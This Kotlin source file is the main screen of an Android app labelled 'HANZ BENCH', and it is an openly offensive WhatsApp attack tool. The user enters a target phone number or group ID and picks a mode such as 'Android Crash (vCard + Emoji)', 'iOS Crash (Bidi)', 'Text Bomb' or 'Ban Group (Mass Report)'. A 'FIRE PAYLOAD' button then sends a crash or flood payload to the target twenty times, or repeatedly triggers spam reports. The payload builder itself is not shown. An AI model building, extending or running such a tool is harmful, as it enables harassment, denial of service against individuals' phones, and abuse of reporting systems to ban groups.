package com.hanz.wabench

import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val root = LinearLayout(this).apply { 
            orientation = LinearLayout.VERTICAL; 
            setPadding(50, 100, 50, 50);
            setBackgroundColor(Color.parseColor("#0F0F0F")) // Dark background
        }

        // Header
        root.addView(TextView(this).apply { 
            text = "HANZ BENCH"; 
            textSize = 28f; 
            setTextColor(Color.parseColor("#00E676")); // Green accent
            gravity = Gravity.CENTER;
            setPadding(0, 0, 0, 10)
        })
        
        // Device Info (Sender)
        val deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
        root.addView(TextView(this).apply { 
            text = "Sender: $deviceInfo"; 
            textSize = 12f; 
            setTextColor(Color.parseColor("#A0A0A0"));
            gravity = Gravity.CENTER;
            setPadding(0, 0, 0, 40)
        })

        // Input JID
        val jid = EditText(this).apply { 
            hint = "Enter JID Target (628xxx / xxx@g.us)"
            setHintTextColor(Color.parseColor("#808080"))
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(30, 30, 30, 30)
            inputType = InputType.TYPE_CLASS_TEXT
        }
        root.addView(jid)

        root.addView(Space(this).apply { minimumHeight = 30 })

        // Spinner
        val modes = listOf(
            "Android Crash (vCard + Emoji)", "iOS Crash (Bidi)", 
            "Delay High (Text Bomb)", "Delay Hard (Flood Mix)", 
            "UI Stall (ZWJ)", "Ban Group (Mass Report)"
        )
        val spinner = Spinner(this).apply { 
            adapter = ArrayAdapter(this@MainActivity, android.R.layout.simple_spinner_dropdown_item, modes)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(20, 10, 20, 10)
        }
        root.addView(spinner)

        root.addView(Space(this).apply { minimumHeight = 40 })

        val status = TextView(this).apply { 
            text = "STATUS: IDLE"; 
            textSize = 14f; 
            setTextColor(Color.parseColor("#00E676"));
            gravity = Gravity.CENTER;
            setPadding(0, 0, 0, 20)
        }

        // Custom Button Gradient
        val fire = Button(this).apply { 
            text = "FIRE PAYLOAD"
            textSize = 16f
            setTextColor(Color.BLACK)
            val gradient = GradientDrawable(
                GradientDrawable.Orientation.LEFT_RIGHT,
                intArrayOf(Color.parseColor("#00E676"), Color.parseColor("#00B0FF"))
            )
            gradient.cornerRadius = 30f
            background = gradient
            setPadding(0, 30, 0, 30)
        }

        fire.setOnClickListener {
            val target = jid.text.toString().trim()
            if (target.isEmpty()) { 
                status.text = "ERROR: JID KOSONG"; 
                status.setTextColor(Color.RED)
                return@setOnClickListener 
            }
            val mode = spinner.selectedItemPosition
            status.text = "STATUS: FIRING..."
            status.setTextColor(Color.parseColor("#FFD600"))
            
            val h = Handler(Looper.getMainLooper())
            var count = 0
            
            // Cek otomatis WA biasa atau WA bisnis
            val waPkg = listOf("com.whatsapp", "com.whatsapp.w4b").firstOrNull { pkg ->
                try { packageManager.getPackageInfo(pkg, 0); true } catch (_: Exception) { false }
            }
            
            fun sendLoop() {
                if (count >= 20) { 
                    status.text = "STATUS: DONE (Sent 20x)"; 
                    status.setTextColor(Color.parseColor("#00E676"))
                    return 
                }
                count++
                if (mode == 5) {
                    val url = "https://wa.me/$target?report=report_spam"
                    try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
                } else {
                    val payload = PayloadBuilder.generate(mode)
                    val intent = Intent(Intent.ACTION_SENDTO).apply {
                        data = Uri.parse("smsto:$target")
                        putExtra("jid", target)
                        putExtra(Intent.EXTRA_TEXT, payload)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    // Set package secara dinamis
                    if (waPkg != null) intent.setPackage(waPkg)
                    
                    try { startActivity(intent) } catch (_: Exception) {}
                }
                status.text = "SENT: $count / 20"
                h.postDelayed(::sendLoop, 800L)
            }
            sendLoop()
        }
        
        root.addView(status)
        root.addView(fire)

        root.addView(Space(this).apply { minimumHeight = 50 })

        // Chat Global Section
        root.addView(TextView(this).apply { 
            text = "Community"; 
            textSize = 18f; 
            setTextColor(Color.WHITE);
            setPadding(0, 0, 0, 15)
        })
        
        val btnChat = Button(this).apply { 
            text = "OPEN GLOBAL CHAT"
            textSize = 14f
            setTextColor(Color.WHITE)
            val outline = GradientDrawable().apply {
                setColor(Color.TRANSPARENT)
                setStroke(3, Color.parseColor("#00E676"))
                cornerRadius = 30f
            }
            background = outline
            setPadding(0, 25, 0, 25)
        }
        btnChat.setOnClickListener {
            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://tlk.io/hanzpublic")))
        }
        root.addView(btnChat)

        setContentView(ScrollView(this).apply { addView(root) })
    }
}
